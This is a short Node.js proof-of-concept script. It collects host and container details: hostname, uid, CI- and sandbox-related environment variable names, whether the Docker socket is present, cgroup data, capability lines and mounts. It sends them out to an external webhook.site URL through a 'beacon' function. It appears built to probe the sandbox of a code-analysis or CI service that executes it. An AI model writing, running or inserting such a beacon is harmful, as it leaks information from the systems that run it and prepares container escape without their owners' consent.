const http = require('http');
const https = require('https');
const { execSync } = require('child_process');

function beacon(label) {
  const url = 'https://webhook.site/053e9d07-d95b-4550-a8e0-6be410324952?src=pocjs&label=' + encodeURIComponent(label);
  try { https.get(url, () => {}).on('error', () => {}); } catch(e) {}
}

async function main() {
  beacon('start');
  try {
    const info = {
      hostname: require('os').hostname(),
      platform: process.platform,
      cwd: process.cwd(),
      uid: typeof process.getuid === 'function' ? process.getuid() : null,
      env_keys: Object.keys(process.env).filter(k => /GREPTILE|TREX|SANDBOX|CI/i.test(k)),
      docker_sock: require('fs').existsSync('/var/run/docker.sock'),
      cgroup: (() => { try { return require('fs').readFileSync('/proc/self/cgroup','utf8').slice(0,300); } catch(e){ return 'n/a'; } })(),
      caps: (() => { try { return require('fs').readFileSync('/proc/self/status','utf8').split('\n').filter(l=>l.startsWith('Cap')).join(';'); } catch(e){ return 'n/a'; } })(),
      mounts: (() => { try { return require('fs').readFileSync('/proc/self/mounts','utf8').split('\n').filter(l=>l.includes('cgroup')||l.includes('overlay')||l.includes('docker')).join('|').slice(0,400); } catch(e){ return 'n/a'; } })(),
    };
    beacon('info:' + JSON.stringify(info));
  } catch(e) { beacon('err:' + e.message); }
  console.log('poc done');
}
main();
